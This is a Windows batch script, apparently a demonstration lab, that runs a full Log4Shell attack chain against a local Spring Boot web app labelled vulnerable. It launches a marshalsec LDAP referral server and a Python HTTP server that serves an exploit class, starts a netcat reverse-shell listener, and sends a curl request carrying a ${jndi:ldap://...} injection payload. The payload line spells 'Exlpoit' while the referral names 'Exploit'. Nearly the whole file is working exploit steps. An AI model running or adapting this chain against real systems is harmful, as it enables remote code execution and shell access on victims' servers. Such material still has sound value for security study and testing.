@echo off
start "spring-boot-vulnerable-webapp" mvn clean spring-boot:run
start "ldap-ref-server" java -cp tools/ldap/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.1.6:9090/#Exploit
start "python-http-server" python -m http.server 9090 -b 192.168.1.6 -d tools/exploit/
start "shell-netcat-listener" tools\ncat\ncat.exe -lvnp 9001
echo wait till all processes are started
echo.
pause
echo press enter to send payload
echo.
pause
start "curl-payload" curl --get http://localhost:8080/example --data-urlencode name=${jndi:ldap://192.168.1.6:1389/Exlpoit}
echo payload send...
echo.
pause
echo check shell-netcat-listener window for shell
echo.
pause
echo press enter to close all opened processes
echo.
pause
TASKKILL /T /F /FI "WINDOWTITLE eq spring-boot-vulnerable-webapp*"
TASKKILL /T /F /FI "WINDOWTITLE eq ldap-ref-server"
TASKKILL /T /F /FI "WINDOWTITLE eq python-http-server"
TASKKILL /T /F /FI "WINDOWTITLE eq shell-netcat-listener"
TASKKILL /T /F /FI "WINDOWTITLE eq curl-payload"
echo done. all finished
echo.
pause